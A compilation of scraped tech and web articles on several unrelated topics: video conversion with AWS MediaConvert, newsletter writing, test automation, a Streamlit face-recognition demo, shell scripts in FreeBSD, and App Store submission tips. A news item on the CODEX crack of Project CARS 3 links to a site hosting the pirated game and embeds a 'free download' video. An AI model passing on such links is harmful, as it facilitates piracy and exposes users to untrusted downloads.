<strong>368x207</strong>, which we planned to use for users on a slow connection. We figured that immediately playing a blurry video with clear audio was a superior experience to waiting for a high-quality video to buffer. This meant that for every question in a lesson, we would generate 12 videos due to the four different sizes and three different formats.</p><h2 id="video-conversion-pipeline">Video Conversion Pipeline</h2><p>We had had success in the past using <a href="https://aws.amazon.com/mediaconvert/">AWS Elemental Media Convert</a> to process and convert videos for our pronunciation feature, so we turned our attention there again in order to create a pipeline for video resizing and conversion that works something like in the diagram below.</p><figure><div><div><p><img src="https://s3.amazonaws.com/sean-blog-images/2020/08/Screen-Shot-2020-08-26-at-10.12.02-AM.png" width="2104" height="300" alt=""></p></div></div></figure><p>Our video production team edits all the videos for a lesson in high resolution using some software called <a href="https://www.blackmagicdesign.com/products/davinciresolve/">DaVinci Resolve</a> and exports the videos into the appropriate lesson folder, naming the videos for the questions they correspond to, <strong>1.mov</strong>, <strong>2.mov</strong>, etc. For <strong>cloze</strong> and <strong>translate</strong> questions, the question types that have a blank and require beeping, the video production team marks the start and end locations of the blanks in DaVinci and export this information in an XML file. This XML file then gets placed in the same folder as the videos. Once the videos and the XML file are ready, the production team runs a script which uploads the videos to an S3 bucket. Videos which need to be beeped are uploaded with metadata indicating the blank start and end times, which are gleaned from parsing the XML.</p><p>The names of the video files that we upload include all the information necessary in order to know the lesson and question number for each video. For example, the video filename for question 3 of Spanish lesson 7 is <code>lesson-7-lang-es-question-3-version-1.mov</code>. The version is simply a way for us to permit a question's video to be changed later, something that has been needed quite a lot, as problems are often found with videos after uploading them. Since we will set the cache-control headers of the video files we generate to allow browser caching, we will need to change the name of the video file when uploading a new video, and the version allows us to do this. The video upload script defaults the version to 1, but if there is already a video for the current question, the script increments the latest version.</p><p>A Lambda watches our S3 bucket for new files, and when it notices one, it kicks off a MediaConvert job which takes the input video file and generates our twelve output files, <strong>1x</strong>, <strong>2x</strong>, <strong>3x</strong>, and <strong>low-bandwidth</strong> resolutions in each of our three formats, <strong>h264/mp4</strong>, <strong>hevc/mp4</strong>, and <strong>VP9/webm</strong>. We name the files in such a way that it's easy to tell which of the twelve files is which, something that MediaConvert makes it really easy to do with the <strong>Name modifier</strong> field.</p><figure><img src="https://s3.amazonaws.com/sean-blog-images/2020/08/Screen-Shot-2020-08-26-at-10.44.07-AM.png" alt=""><figcaption>The twelve output files produced as a result of uploading a single video</figcaption></figure><p>Looking at the file sizes for the different videos above, a few things stand out. </p><p>First, at really low resolutions, using the more highly compressed formats hardly saves you any bytes at all, even on a percentage basis. I don't have a good understanding of video compression, but I <strong>think</strong> that, intuitively, this makes sense, as there are fewer pixels to analyze across the length of the video, and thus fewer spots across frames to find common ground for compression. </p><p>Second, despite the <strong>2x</strong> videos having four times the number of pixels as the <strong>1x</strong> videos and the <strong>3x</strong> videos having nine times the number of pixels as the <strong>1x</strong> videos, those videos are not four times and nine times larger than their <strong>1x</strong> counterparts. This is a result of us restricting the maximum bitrate for the <strong>2x</strong> and <strong>3x</strong> videos using MediaConvert settings due to the following …</p></div></section></article></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><em>Summary: My goal here is showing you a different blueprint for what newsletters can be, with examples of terrible vs great newsletters and tips to succeed with your own.&nbsp;</em></p><p>‍</p><p><strong>Publishing an article online is accepting vulnerability.</strong> It’s feeling like shit for a while: you're judged, you're an imposter and an annoyance. <em>A newsletter is worse</em>: it’s knowingly annoying hundreds of people at the same time. Feeling like spam doesn't feel good, so we don’t do it.&nbsp;</p><p>‍</p><p>I started a newsletter a year ago. I added a signup box to the first landing page of this website as an afterthought, "Put your email, get updates". I forgot about it. But people have been signing up and now I have a few hundred emails. But I didn’t send any newsletter because I was afraid, <em>I felt like spam</em>.&nbsp;</p><p>Over the last months I've been receiving newsletters that feel like nice conversations, packages in the mail stuffed with interesting treats. I now use the same model and my subscribers love it. I actually look forward to sending the next one.</p><p>‍</p><p><strong>We associate newsletters to bad marketing</strong>, bragging, promoting, annoyance. Yes, most newsletters suck. Great newsletters exist though. <a href="https://substack.com/discover?ref=supercreative">Some people even pay for a lot for them</a>. What makes them good?</p><h2>Changing your view</h2><p>Let me try changing your perception of what a newsletter can be. By the end, you hopefully have enough reasons to overcome your fears and hit send.&nbsp;</p><p>‍</p><p>First, <strong>think of a newsletter as similar to a letter for a friend</strong>. You're trying to share some things that you recently found interesting and want to bring value into their life and your relationship with them. Keep this in mind with you write and imagine that you're writing a letter to your friend. Your relationship with your subscribers shouldn't be transactional. People don't want "updates" from you. <a href="https://nadiaeghbal.com/perks?ref=supercreative">They want to cultivate a relationship with you</a>. They may be past or potential clients, friends, family or just curious people. Newsletters are the best way for building 1-to-1 ongoing relationships with hundreds of people, simultaneously. Take advantage of that.</p><p>‍</p><p>Second, <strong>don’t be afraid to share things you haven’t made yourself</strong>. People come from your version of content as much as the content itself. There are thousands of newsletters and countless ways to get new information today. And it's precisely this abundance of information that pronounces our need to bond with some people. People who signed up to your newsletter chose to find meaning in <em>your</em> curation of information. When you give a peek into your life, sharing selfies or the book you’re reading, you’re breaking this company newsletter model and allowing your subscribers to feel an emotional attachment to you. You’re the medium.</p><p>‍</p><p>Third, <strong>don’t copy brands</strong>. Almost all company newsletters make you feel being sold to and insignificant. This is the opposite of receiving an email from a good friend. We automatically, unconsciously categorize templated emails as spam, not the type of email you'd receive from someone you love. Instead, take inspiration from emails sent by independent creators. They use plain text.&nbsp;</p><p>‍</p><p><strong>Newsletters are what we make out of them</strong>. They don’t have to <em>be something</em>. They can be anything! They’re just emails sent on a regular basis. Imagine all of us had our own "party talk" email lists, a place to find out about what each person is thinking about, like what <a href="http://mason.gmu.edu/~rhanson/personalesalons.html">Robin Hanson imagined in 1994</a>. A future where everyone has their private salons. You can just sign up to a conversation or leave it. Social media without big brother.&nbsp;</p><p>‍</p><p>Finally (and only finally), these <strong>email relationships create incredible leverage</strong> to find new clients, sell your courses or get new users for your product (<a href="https://www.supercreative.design/blog/hyper-freelance">or the three at the same time</a>). If you see it rationally, not sending a newsletter is a big opportunity cost. Take note though: selling is a consequence of the first two points. Maintaining strong relationships with people who find your work useful is worthwhile by itself. You don’t have to be selling anything, a newsletter just helps.&nbsp;</p><p>‍</p><h2>Some examples</h2><p>Let’s compare:<br></p><figure id="w-node-d4b787d93533-8ff50e46"><p><img src="https://assets-global.website-files.com/5d768372d2b144cdff0dffed/5f47c5e1c4c7e6ee32fcd5a9_relationship%20example.jpg" loading="lazy" alt=""></p><figcaption>This is how you create a relationship: being nice and transparent.</figcaption></figure><p>‍</p><figure id="w-node-21db5ea3a70a-8ff50e46"><p><img src="https://assets-global.website-files.com/5d768372d2b144cdff0dffed/5f47c5eeb1716c32fd025593_template%20example.jpg" loading="lazy" alt=""></p><figcaption>Who would send a templated email except a company?</figcaption></figure><p>‍</p><figure id="w-node-b4f8d568f5b9-8ff50e46"><p><img src="https://assets-global.website-files.com/5d768372d2b144cdff0dffed/5f47c5f79f70ac64c93b9116_selling%20example.jpg" loading="lazy" alt=""></p><figcaption>Just be helpful. Teach everything you know. Give, give, give!</figcaption></figure><p>‍<br></p><h2>Other tips for sending newsletters</h2><ul role="list"><li><a href="https://coschedule.com/blog/best-time-to-send-email/#:~:text=Tuesdays%20get%20the%20most%20emails,tie%20for%20Monday%20and%20Wednesday." target="_blank">The best days to send a weekly newsletter are Tuesdays and Wednesday mornings.</a> Choose Friday if you want to be associated with fun, relaxing stuff. Monday for more serious stuff.</li><li>You don’t even have to use Mailchimp to send newsletters! You can just include everyone as BCC. Works well for smaller newsletters with a few hundred subscribers. Over this threshold I’d suggest the easy-to-use <a href="https://app.convertkit.com/referrals/l/fb74d4a5-9ec1-4af7-b7a6-24e5c29b4a67" target="_blank">ConvertKit</a>.&nbsp; </li></ul><ul role="list"><li>Champion subscribers who reply and share screenshots of recent positive conversations. This will set the stage to what others can do if they appreciate your newsletter.&nbsp;</li><li>Publish newsletters consistently, make it a ritual in your week. If it's too hard, set up an accountability deal where you give your friend money if you don't send the weekly newsletter (and vice versa).</li><li>Use bullet points :)</li></ul><p><strong>I'm on a quest to send the best newsletter ever</strong>. How do I measure that? By the amount of answers I get vs number of total subscribers. I encourage my subscribers to reply with questions and share their own discoveries. Here's a preview of the one I sent last week:</p><figure id="w-node-0cf99d0a9732-8ff50e46"><p><img src="https://assets-global.website-files.com/5d768372d2b144cdff0dffed/5f46da66ba38699a350d5786_hQfk3Yab0JqaoYitL5iRyp8dFjqZUkCFWrb2VWyoCwFV6405OLNY0esH8_9v7onEhQcYkCwx4GpAunye4Oo4VZFgNYK5G30829iL7kt3bdM4BhhLs7DAQtQSwnk_VUWMVJIYvh_a.png" alt=""></p></figure><p>Now...&nbsp;Hit send! </p><p>‍</p><p><em>Thanks to Stew Fortier for reading and reviewing drafts of this.</em><br>Let's keep in touch 👇</p></div></div>]]>

        <blockquote><p>The key to successful use of test-automation tools is to correctly calibrate expectations: Recognize what the software can do and be equally aware of what it cannot do. That helps you make useful decisions in the most important areas: what can and should be automated, how it should be done, and who should do it.</p></blockquote>
<p>The purpose of automated testing is to help people work smarter. Use test automation to take the development effort where humans can’t go, and amplify the testing of good testers.</p>
<p>Despite the field’s established history, some CIOs and managers expect test automation to fully automate all product testing, magically create 100% code coverage, and catch all bugs. Not to mention a secret belief that they can fire all the talented people and hire a chimp.</p>
<h3>1. Automation reflects a process; it doesn’t replace it</h3>
<p>Don’t confuse <a href="https://www.functionize.com/blog/automated-functional-testing-101/">test automation</a> with vendor tools. However good they are – and we do like to think that Functionize exemplifies the best possible options! – any tool can only help you improve a process. Think of a kitchen blender, which is a more efficient way to combine ingredients than is a mortar and pestle. Or consider carpentry: Power tools help a carpenter build a house faster than with hand tools, but she doesn’t just sit back and watch the tools build the house by themselves.</p>
<p>Rather, approach test automation as a way to test applications for conformance to the QA criteria by which you judge software as ready to release. The tools allow you to submit input, capture output, and compare it against a baseline. In other words, test automation tools merely automate a process you already (we hope) have in place.</p>
<p>That’s the danger and the opportunity. Automating a good process shows how good that process is. Automating a bad process amplifies its weaknesses.</p>
<h3>2. It’s another development project</h3>
<p>Treat the test-automation project like any other development project. That means putting together specifications on what it will and will not do, how the code/modules are designed, and so on.</p>
<p>The automation needs to be planned, managed, monitored and supported just like a real application development project. It’s just another kind of product development, and thus beholden to the same rules and processes as any other type of software development project.</p>
<h3>3. Automate the right things</h3>
<p>Test automation is an ideal solution in several situations, but don’t force these tools into the wrong role. Among the positive points: It is a good way to get repeatable tests, to expand application coverage, to speed up tests on subsequent versions of the application, and to do <a href="https://www.functionize.com/blog/regression-testing-what-you-need-to-know/">regression testing</a>.</p>
<p>But it is automation, not automagic. Don’t expect to automate everything. Some tasks inherently require manual testing.</p>
<p>The testing part still belongs to the testers. Those professionals are responsible for coming up with appropriate input to exercise the application, working out whether the output is both correct and according to spec, and looking for bugs.</p>
<h3>4. Get the right people</h3>
<p>Apparently, many managers assume that because the automation tools do all the work, an intern can run the software. This attitude gets professional testers’ shorts tied in a knot.</p>
<p>“Get the right staff,” one tester insisted. “This type of work requires the right type of skills and knowledge. Testers need to know how to write code, how the application under test is built, and how to do testing.”</p>
<p>For any nontrivial test-automation project, <a href="https://www.functionize.com/blog/5-reasons-why-qa-needs-humans/">you need dedicated personnel</a>. As long as the developers have to split their time between automated and manual testing responsibilities, the test-automation effort never really gets up and going in a truly successful manner.</p>
<h3>5. Design applications to be tested</h3>
<p>Automated or no, QA tests don’t come out of nowhere. Programmers should create their applications with testability in mind, or at least with clear communication among the business subject-matter experts, the development staff, and the QA team.</p>
<p>One example of the design-for-test approach is for QA staff to set conventions that developers follow. For example, get developers to always guarantee a unique way of identifying an object. It can be its associated text, a title, a unique ID, etc. Once you have this standard set, see if the test tool has options for setting the order in which it picks an identifiers.</p>
<p>Otherwise, you can slow down the testing process. “The main difficulty I faced was the inconsistency of the different warning or error messages the product was returning to the user,” a tester told me. “The same message window was used either for a warning or a error, but from the automation point of view it was really hard to figure out if you should list the run as successful or as a failure,” she added.</p>
<blockquote><p>The promise of continuous testing is faster delivery of higher quality software. Our white paper explains <a href="https://www.functionize.com/project/continuous-testing-the-good-the-bad-and-the-ugly/">how it works</a>.</p></blockquote>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><main><article><main><a href="https://pento.ai/blog/terran-meets-streamlit-components"><p>Terran's face recognition meets Streamlit Components</p></a></main><p>We can’t believe Streamlit is barely one year old now. Today, we can’t think of any better tool for creating a fast and interactive dashboard, demos, and visualizations. On top of that, they recently launched a new awesome feature called <a href="https://www.streamlit.io/components">Streamlit Components</a>. This new feature enables developers to create custom visualizations using your favorite front-end framework, namely React, Vue, or just plain HTML.</p><p>Especially, Streamlit is really convenient when starting new machine learning projects, making it super easy and fast to go from nothing to a proof of concept of a ML solution. Because of this, we use Streamlit pretty frequently: for project prototyping, dynamic reports, and for building cool demos 💅</p><p>Particularly, our open-source project Terran was not an exception to this. We've built a face-recognition timeline demo to demonstrate how easy it is to use Terran on YouTube videos, and additionally, how straightforward it is to create amazing visualizations using the new Streamlit Components! 🚀</p><p>In this blog post, we'll share how the process of building this component was, and hopefully, inspire you to build your own component or demo using Terran!</p><p>Our demo consists of the following:</p><ol><li>You take any video from YouTube that has people in it, for example, <a href="https://youtu.be/mbdOqxdiSZc" target="blank" rel="noopener">this Big Bang Theory video</a>.</li><li>Then, we use Terran to detect all the faces that appear in the video, and when they actually appear on the screen.</li><li>Finally, we create a timeline visualization that shows in green when someone is present in the video.</li><li>Optionally, we can make it dynamic so that when the user clicks on a specific time of the timeline, a video player is rendered and it'll begin playing starting from the second the user clicked.</li></ol><p>The final result looks like this</p><a id="what_is_terran" href="#what_is_terran"></a><p><img src="https://pento.ai/images/blog/terran-square.svg" alt="Terran face-recognition timeline"></p><p>Terran is our open-source human perception library. We focus on providing open, auditable, and performant alternatives to closed approaches. Solutions that can run on your computer or device and that will adapt to the environment that it's in. But most importantly, code that you can test (without piling-up costs), understand and modify to your needs.</p><p>You can check out the <a href="https://pento.ai/blog/introducing-terran">Terran's introduction blog post</a> to know more about this project! Also, you can support our project and give it a try and why not a star in Github 💫</p><a id="using_terran's_face-recognition_modules" href="#using_terran's_face-recognition_modules"></a><p>The demo consists of automatically detecting and tracking faces on YouTube videos. With this information, we can generate timeline charts showing specifically when each person appears on the screen or not. The idea then is to use Terran's face-recognition library to generate all the data needed to create a timeline visualization, and then we can create a new Streamlit Component to create a fancy and interactive timeline chart!</p><p>We can split the processes into the following steps:</p><ol><li>Generate the timeline data from a YouTube video using Terran</li><li>Bootstrapping your Streamlit Component and declare the input/output data bindings</li><li>And creating a custom and interactive visualization tool using React and D3</li></ol><p>Let's dive in!</p><a id="generate_the_timeline_data_from_a_youtube_video_using_terran" href="#generate_the_timeline_data_from_a_youtube_video_using_terran"><h2>Generate the timeline data from a YouTube video using Terran</h2></a><p>This is pretty simple. Using Terran's <code>open_video</code> we will iterate through the video's frames, and using the functions <code>face_detection</code> and <code>extract_features</code> we'll detect for each frame where the faces are and a vector representation -features- of each face.</p><p><img src="https://pento.ai/images/blog/terran-streamlit-diagram.jpg" alt="Terran Streamlit timeline generator diagram"></p><p>Then, we can start comparing the extracted features to know if we're talking about the same person or not, we can do a simple <code>cosine_distance</code> threshold to know if that's the case.</p><p>Finally, we create a data structure that stores for each detected person all the frame indexes in which they appear, and that's it!</p><p><img src="https://pento.ai/images/blog/terran-streamlit-structure.jpg" alt="Terran Streamlit timeline generator data structure"></p><p>We created a function <code>generate_timeline</code> that does this exact same logic, plus some other minor features. When being used, it looks as simple as this:</p><pre><pre><code>from streamlit_terran_timeline import generate_timeline

timeline = generate_timeline("https://youtu.be/mbdOqxdiSZc")
</code></pre></pre><a id="bootstrap_your_streamlit_component_and_declare_the_input/output_data_bindings" href="#bootstrap_your_streamlit_component_and_declare_the_input/output_data_bindings"><h2>Bootstrap your Streamlit Component and declare the input/output data bindings</h2></a><p>This step might work differently for you depending on your frontend skills. In particular, we're more into working with React, so this <a href="https://github.com/streamlit/component-template/tree/master/template">Streamlit Component template</a> was great for setting up the demo.</p><p>We think the way of integrating new components to Streamlit is very smart: just assume that you can send all the data you need to build the component as long as this data can be JSON serialized. Additionally, our template will declare our component in a developing stage, so that it is easier for us to adjust our frontend with hot reloading as we make changes. You can go to the <a href="https://docs.streamlit.io/en/stable/streamlit_components.html">official Streamlit documentation</a> for more details.</p><p>To declare the bidings of our component, we create our component function called <code>terran_timeline</code> like this:</p><pre><pre><code>def terran_timeline(timeline, key=None):
    component_value = _component_func(timeline=timeline, key=key, default=0)

    return component_value
</code></pre></pre><p>...where the <code>_component_func</code> is the one that declares our Streamlit Component and we are saying that we want to send a data structured by the name of <code>timeline</code> to this component. The additional <code>key</code> argument makes it possible to have multiple components of the same kind by specifying different keys, and the <code>default</code> argument stands for the default return value of the component, which in this case means starting second value for the video.</p><a id="create_a_custom_and_interactive_visualization_tool_using_react_and_d3" href="#create_a_custom_and_interactive_visualization_tool_using_react_and_d3"><h2>Create a custom and interactive visualization tool using React and D3</h2></a><p>Then we have to move into the React world and start building our component. The good news is that we can retrieve the <code>timeline</code> object inside our component super easily!</p><pre><pre><code>public render = (): ReactNode =&gt; {
    const timeline = this.props.args["timeline"]
    ...
}
</code></pre></pre><p>Also, we can make our component "return" a value using the <code>Streamlit.setComponentValue</code> function they provide in the template, for example, making that when the user clicks on the timeline widget</p><pre><pre><code>//
// If the user clicks on the timeline, we set the component value to the
// time in seconds where the user clicked
//
Streamlit.setComponentValue(seekTimeSecond);
</code></pre></pre><p>The rest is mostly plain React and D3 stuff we think it's not worth focusing on this blog, but if you are interested you can check how it was implemented in our <a href="https://github.com/pento-group/streamlit-terran-timeline">streamlit-terran-timeline repo</a>.</p><p>Here's an example of what it looks like to use this new Streamlit Component:</p><pre><pre><code>import streamlit as st
from streamlit_terran_timeline import generate_timeline, terran_timeline

# Generate the timeline information
video_url = "https://youtu.be/mbdOqxdiSZc"
timeline = generate_timeline(video_url)

#
# Display the timeline. If the users click, you'll get the exact second of
# the part of the timeline video. By default, it returns 0.
#
start_time = terran_timeline(timeline)

#
# Display the video. Optionally, the user might click the timeline and start the video
# from a different time
#
st.video(video_url, start_time=start_time)
</code></pre></pre><p>In summary, the Streamlit Components feature is a game-changer. It was never more straightforward for us to create dynamic, reliable, and nice-looking pilot projects or demos from scratch. It's also really amazing that the Streamlit community is building new components and we're really thrilled to contribute with ours! If you are interested, you can see a full list of published and upcoming components <a href="https://discuss.streamlit.io/t/streamlit-components-community-tracker/4634">in this community post</a> .</p><p>This is the first of many upcoming Terran demos, so stay in touch to know what other cool stuff we're building! You can follow us on <a href="https://twitter.com/pentogroup">Twitter</a> and <a href="https://www.linkedin.com/company/pentogroup/">LinkedIn</a>, and you can also subscribe to our newsletter!</p></article></main></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-10591"><div><div><div><h2>Project CARS 3 game from Slightly Mad Studios cracked and leaked by hackers three days before its scheduled launch</h2><p>Hackers have managed to crack the upcoming top racing game called Project CARS 3 and leak it online. They managed to do this just three days before the scheduled launch of the Project CARS 3 racing game on 28th August 2020.</p><p>Project CARS 3 is a racing game developed by Slightly Mad Studios and published by Bandai Namco Entertainment. It is scheduled to be released on 28 August 2020 for Microsoft Windows, PlayStation 4, and Xbox One.</p><p>However, hackers somehow got hold of the full version of Project CARS 3 game and cracked it before leaking it online. If you visit websites like <a href="https://igg-games.com/project-cars-3-free-download.html">igg-games.com</a>, you will find the cracked version of the game. The hacking and cracking work is believed to the work of a game cracking hackers group called CODEX. Reports say that the CODEX hacker group managed early access to Project CARS 3 by purchasing a deluxe version of the game however this doesn’t seem possible as the game was yet to be released.</p><p>CODEX game/Apps hacking/cracking group is not new. The CODEX hacking group is better known as CDX on dark web forums and is primarily a warez group founded in February 2014. They have managed to release many cracked version blockbuster games using a customized Steam licensing crack. They have also developed a code to emulate Ubisoft’s Uplay DRM protection.</p><p>CDX group says that they have written their own code for the DRM emulation. CDX has been so successful at their work that from&nbsp; 2016 to 2020 they have leaked 3700 cracked blockbuster games on the Internet.</p><p>Project Cars 3 didn’t any great security protections and was only equipped with Steam‘s standard DRM protection so the CDX group cracked it quite easily. Most games released nowadays come with <a href="https://www.howtogeek.com/400126/what-is-denuvo-and-why-do-gamers-hate-it/">Denuvo protection</a> which is hard to crack. Not that CDX group didn’t have the tech for it. In late 2019, a crack developed by CODEX for Need for Speed: Heat, which uses Denuvo DRM, was leaked online. CDX cracks are normally protected by anti-debugging tools like VMProtect or Themida to stop others from reverse-engineering the crack. However, the Denuvo DRM crack was leaked allegedly by a pentester. After the leak, the CDX group stopped using this particular crack but in June 2020, when they released cracked copies of Team Sonic Racing, Trials of Mana, The Quiet Man, and an updated version of Far Cry: New Dawn.</p><p><iframe title="Project Cars 3  cracked -  for free - download in description" width="702" height="395" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen="" data-src="https://www.youtube.com/embed/C8bAbt63VS0?feature=oembed" src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></iframe></p><h2>About Project Cars 3 racing game</h2><p>Project CARS&nbsp; 3 is a racing game that features multiple game modes, track varieties, cars, and more additions.

August 27, 2020 | https://www.spinellis.gr/blog/20200827/ | <a href="https://web.archive.org/web/*/https://www.spinellis.gr/blog/20200827/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div> <!-- Left content -->
  <p>In an open online <a href="https://www.spinellis.gr/unix?source=bl20200827">edX course on Unix tools</a> I was running over the spring with more than a thousand registered learners, I got <a href="https://courses.edx.org/courses/course-v1:DelftX+UnixTx+1T2020/discussion/forum/93544458673f7c2519a5746c18f1dcc1c3cd4d49/threads/5e77554aeac4b40832a040e4">asked for ideas on how shell scripts can be useful</a>. This is an intriguing question, because the course focuses mainly on performing one-off tasks in the areas of software development, data engineering, and system administration, rather than automation through shell scripts. In response, I posted <a href="https://www.spinellis.gr/blog/20200323">how shell scripting improves my personal productivity</a>. Here's my take on how shell scripts are employed in diverse software development tasks. I plan to post further installments on system administration and data analytics.</p>
<p>To produce the examples listed here, I searched the entire <a href="https://www.freebsd.org/">FreeBSD</a> source code tree for files with a <code>.sh</code> (shell script) suffix. In total I found 1305 scripts (by running the Unix <code>find /usr/src/ -name \*.sh | wc -l</code> pipeline). In summary, I found that shell scripts are used for testing, as program wrappers and adaptors, for stand-alone program implementations, as code generators, for build orchestration and automation, for release management, and for crafting development tools. My experience is that other large software systems use shell scripts in similar ways.</p>
<h3 id="testing">Testing</h3>
<p>Shell scripts are used to automate integration testing, by running the program under specific configurations and scenarios and verifying that the program has the expected behavior. They are also be used for regression testing, by running a program and comparing its output against results of previous runs. The FreeBSD <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/tests">/tests</a> suite contains 261 tests of both kinds. Many other programs have test scripts bundled with their source code; see for example the <em>pkill</em> command <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/bin/pkill/tests">tests directory</a>. As an example of regression testing consider the <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/crypto/openssh/regress">OpenSSH regression tests</a>. In total, another 355 test shell scripts reside in individual programs' <code>tests</code> directories and 227 come bundled with the separate <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/contrib/netbsd-tests">NetBSD test suite</a>.</p>
<h3 id="program-wrappers-and-adaptors">Program wrappers and adaptors</h3>
<p>In some cases, either by design or through evolution, a program can be easily written by having a shell script call another one. Consider the following examples.</p>
<ul>
<li>The program <em>ranlib</em>, which adds a symbol table to an archive (library) file, used to be <a href="https://github.com/dspinellis/unix-history-repo/blob/BSD-4_3/usr/src/usr.bin/ranlib.c">a stand-alone program</a>. It is now implemented as a <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/contrib/binutils/binutils/ranlib.sh">one-line shell script</a>, which calls the <em>ar</em> program to do the actual work.</li>
<li>The <em>lp</em> POSIX 1003.2-compliant print spooler interface is implemented as a <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/lpr/lp/lp.sh">wrapper</a> around the traditional BSD <em>lpr</em> command.</li>
</ul>
<h3 id="program-implementations">Program implementations</h3>
<p>Some programs are easy to construct by gluing together other existing Unix commands in a shell script. Here are some examples.</p>
<ul>
<li>The <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/adduser/adduser.sh">adduser</a> and <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/adduser/rmuser.sh">rmuser</a> user management commands.</li>
<li>The <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/manctl/manctl.sh">manctl</a> program, which compresses or decompresses the system's manual pages.</li>
<li>The <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/service/service.sh">service</a> system service management command (the equivalent of the <em>systemd</em> <em>systemctl</em> command).</li>
<li>The <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/ypserv/ypinit.sh">ypinit</a> command, which builds and installs network information service (NIS or yellow pages) databases.</li>
<li>The <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/usr.sbin/freebsd-update/freebsd-update.sh">freebsd-update</a>, which fetches and installs the system's binary updates.</li>
</ul>
<h3 id="code-generation">Code generation</h3>
<p>Many scripts are used for creating code from higher level descriptions. Consider the following cases.</p>
<ul>
<li>Trivially, the <em>flex</em> <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/contrib/flex/mkskel.sh">mkskel</a> script, reads a text file containing the boilerplate of the generated lexical analyzer, and converts it into a C array that can be compiled into the lexical analyzer generator executable program.</li>
<li>The <em>curses</em> library <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/contrib/ncurses/include/MKparametrized.sh">MKparametrized</a> script generates C source for an array specifying whether terminal capability (<em>termcap</em>) strings should undergo parameter and padding translation.</li>
<li>As a more sophisticated case, the kernel's <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0//sys/kern/makesyscalls.sh">makesyscalls</a> shell script, reads <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/sys/kern/syscalls.master">a declarative specification of the supported system calls</a>, and generates the C code that implements the interface to call the lower-level implementation routines.</li>
</ul>
<h3 id="build-orchestration-and-automation">Build orchestration and automation</h3>
<p>Although shell commands can be readily specified in most build systems, such as <em>make</em>, complex build actions are better documented and tested by putting them in a separate shell script file. For example, <em>yacc</em> uses such a script to <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/contrib/byacc/test/run_make.sh">orchestrate the build process</a>, while <em>libsodium</em> <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/sys/contrib/libsodium/dist-build/">uses separate shell scripts</a> to initiate the <em>make</em>-based build process on different systems, ranging from iOS to Android. More widely, the <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/share/mk/meta2deps.sh">meta2deps</a> shell script looks for "meta" files and extracts information needed to deduce build and src dependencies, <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/tools/build/depend-cleanup.sh">depend-cleanup</a> cleans dependencies after some difficult-to-track source code changes, and <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/tools/tinder.sh">tinder</a> builds parts of the source code tree on all supported architectures.</p>
<h3 id="release-management">Release management</h3>
<p><a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/release/scripts">Several scripts</a> are used for putting together the system's release, including the distribution packages, the release notes, the distributed file manifest, and the architecture-specific ISO images.</p>
<h3 id="development-tools">Development tools</h3>
<p>Shell scripts are also used for constructing <em>ad hoc</em> tools for bespoke development tasks. For instance, the <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/tools/tools/kernxref/kernxref.sh">kernxref</a> tool creates a cross reference of a kernel's symbols, while the <a href="https://github.com/freebsd/freebsd/blob/release/12.1.0/tools/tools/kernelcruft/kernelcruft.sh">kerncruft</a> tool finds unused kernel source code files.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

        

                          <p><em><span>Zero value, Lorem Ipsum-texts, bugs, and crashes — these are evident parts of every article titled ‘</span><span>App Store Submission Checklist’</span><span>. Let’s go through the non-obvious moments at the review stage.</span></em></p>
<p><span>Submitting apps to the App Store — Purrweb, an </span><a href="https://www.purrweb.com/"><span>MVP development</span></a><span> company, has tons of experience on this matter. In this </span><span>App Store Submission Checklist</span><span>, we propose studying out all probable pitfalls that may result in a several-weeks (or even several-months) delay of the app release. Welcome!</span></p>
<h2>1. Subscription management</h2>
<p>It’s important for the App Store team to know that when the user taps the ‘Buy’ button it won’t lead to any abrupt consequences for them. What does it mean for you? First of all, there should be no non-obvious hurdles — all text content should be concise, transparent, and easy to read.</p>
<p>Check out the example below: this is how the subscription screen of Talentum, a <a href="https://www.purrweb.com/portfolio/talentum/">food delivery service</a>, that we developed in Purrweb changed during the App Store submitting stage. When we sent the first build, the App Store rejected it due to the ‘blurred’ benefits for users in the description. Redesign was aimed at transparency.</p>
<p>The screen you see on the right went through:</p>
